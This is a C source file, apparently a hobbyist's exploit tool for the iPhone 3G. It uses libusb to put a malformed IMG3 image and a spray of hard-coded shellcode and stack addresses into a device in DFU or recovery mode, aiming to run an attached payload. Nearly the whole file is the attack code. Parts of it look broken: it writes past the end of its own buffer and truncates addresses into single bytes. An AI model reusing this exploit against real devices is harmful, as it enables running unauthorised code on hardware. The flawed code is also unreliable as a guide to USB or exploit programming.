#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <libusb-1.0/libusb.h>


#define VENDOR       (int)0x05AC
#define NORM_MODE       (int)0x1290
#define RECV_MODE       (int)0x1281
#define WTF_MODE        (int)0x1227
#define DFU_MODE        (int)0x1222
#define BUF_SIZE        (int)0x10000
#define DFU_PACKET_LEN 0x800
#define LOG_HEAD "\nadrenaline:: ** "
libusb_device_handle *handle = NULL;
libusb_context *cont;

/*
			iphone dfu requests
				REQUEST 6: ABORT (aborts any current action happening )
				REQUEST 0xA1: STATUS (get current status of dfu file transfer)
				REQUEST 0x21: SEND(TX) (used for sending bytes.)
				REQUEST 4: clear current status

		etc.. requests are the same as DFU mode on stm32!
		probably cause stm32 is also armv6 right? am i right?

*/

void adrenaline_check_istatus()
{
	uint8_t state =0 ;
	printf("\n??");
	
	libusb_control_transfer(handle,0xa1,5,0,0,(unsigned char*)&state,1,1000);
	printf("\n%s idevice_state:%d",LOG_HEAD,state);


	if(state == 2){
		printf("\nadrenaline:: **  device status: OK!");
	}
	else{
		//printf("\n%s NOT OK:%d",state,LOG_HEAD);

		
		if(state != 10){
			printf("%s in middle of an action. sending DFU_ABORT!",LOG_HEAD);
			libusb_control_transfer(handle, 0x21, 6, 0, 0, NULL, 0, 1000);//abort is basically a request number six, with null!
		}
		else{
			printf("%s DFU error! (WARNING , DFU EITHER DIDN'T ACCEPT IMG3 ,OR IT CRASHED!",LOG_HEAD);
			//exit(1);
			libusb_control_transfer(handle, 0x21, 4, 0, 0, NULL, 0, 1000);
		}
		
	}
		
}

void adrenaline_connect_to_idevice(){
		int ret = 0 ;

	  if((handle =libusb_open_device_with_vid_pid(cont,VENDOR,RECV_MODE)) == NULL){ 
	     if((handle =libusb_open_device_with_vid_pid(cont,VENDOR,DFU_MODE)) == NULL){ 
	        if((handle = libusb_open_device_with_vid_pid(cont,VENDOR,WTF_MODE)) == NULL){

	        
	            printf("\ndevice in invalid mode.");
		//	exit(1);	        
			handle= libusb_open_device_with_vid_pid(cont,VENDOR,4754);
			if(handle == NULL){
				printf("problem.");
				exit(1);
			}
	        }
	        else{
	          printf("\nrunning in WTF mode.");
	        }
	    }      
	    else{
	      printf("\nrunning in DFU mode.");
	    }

	  }
	  else{
	      printf("\nrunning in iTunes mode.");

	  }

	    ret = libusb_set_configuration(handle,1);
	    if(ret <0 ){
	      printf("\n*** setting libusb config failed.");
	      exit(1);
	   	}
	    ret=libusb_claim_interface(handle,0);
	    if(ret <0 ){
	      printf("\n*** claiming libusb interface failed.");
	      exit(1);
	   	 }
	    ret =libusb_set_interface_alt_setting(handle,0,0);;
	    if(ret <0 ){
	      	printf("\n*** setting-alt interface failed.");
	      	exit(1);
	    }
	  
}
void adrenaline_run_exploit(char *shellcode_filename){

	printf("%s creating IMG3...",LOG_HEAD);
	FILE *fd = fopen(shellcode_filename,"r");
	int size=0;
	fseek(fd,0,SEEK_END);
	size= ftell(fd);
	fseek(fd,0,SEEK_SET);
	printf("%d",size);
	unsigned char* payload=(unsigned char*)malloc(size);
	fread(payload,sizeof(unsigned char),size,fd);
	printf("\n%d",size);
	unsigned char title[]="3gmI"; 
	//unsigned char* psize = itoa(size);//payload size
	unsigned char header[]="\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00orez";

	unsigned char* dirty_img3= (unsigned char*)malloc(2048);
	memset(dirty_img3,0,20+size);
	//copying img3 header to img3 buffer.
	for(int i =0 ;i<4;i++){
		dirty_img3[i] = title[i];
	}
	dirty_img3[4] = (unsigned char)size;
	int k  =5;

	for(int i =0;i<15;i++){
		dirty_img3[k]= header[i];
		k++;
	}
	k++;
	printf("\nk:%d",k);
	for(int i =0;i<size;i++){
		dirty_img3[k] = payload[i];
		k++;
	}
	

	if(size< 2048){

		for(int i = k;i<2048;i++){
			dirty_img3[i] =0xBB;
		}
	}	
	adrenaline_connect_to_idevice();
	adrenaline_check_istatus();
	int img3_size=20+size;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84026214+1;
	unsigned char buff[0x800];
	memset(buff,'\xBB',0x800);
	printf("%s sending payload...",LOG_HEAD);
	for(int i =0 ;i<0x800;i+=0x40){
		unsigned char* heap=(unsigned char*)(buff+i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}
//	libusb_reset_device(handle);
	//sleep(1);
	libusb_control_transfer(handle,0x21,1,0,0,dirty_img3,img3_size,1000);

	libusb_control_transfer(handle,0x21,1,0,0,buff,0x800,1000);
	
	memset(buff,0xBB,0x800);


	libusb_control_transfer(handle,0xA1,1,0,0,buff,0x800,1000);
	libusb_control_transfer(handle,0x21,1,0,0,buff,0x800,1000);

	libusb_control_transfer(handle,0x21,2,0,0,buff,0,1000);

	libusb_control_transfer(handle, 0x21, 1, 0, 0, 0, 0, 1000);

	libusb_control_transfer(handle,0x21,1,0,0,payload,0,1000);
	unsigned char *resp = (unsigned char*)malloc(6);
	memset(resp,0,6);
	for(int i =0 ;i<2;i++){
		if(libusb_control_transfer(handle,0xA1,3,0,0,resp,6,1000)!= 6){
			printf("\nerror execution status. %d",i);
			exit(1);
		}
	}


	libusb_reset_device(handle);


	printf("%s success.",LOG_HEAD);
	adrenaline_check_istatus();
//	libusb_reset_device(handle);


}	
	


int main( int argc, char *argv[]){
	system("clear");
  printf("\niPhone 3G exploit , made by nitrodegen. please work.");
  int ret =0;
  ret = libusb_init(&cont);
  if(ret < 0 ){
     printf("\ncannot init.");
     exit(1);
  }

  adrenaline_run_exploit("./payload.bin");

	libusb_close(handle);
  
  libusb_exit(cont);

}
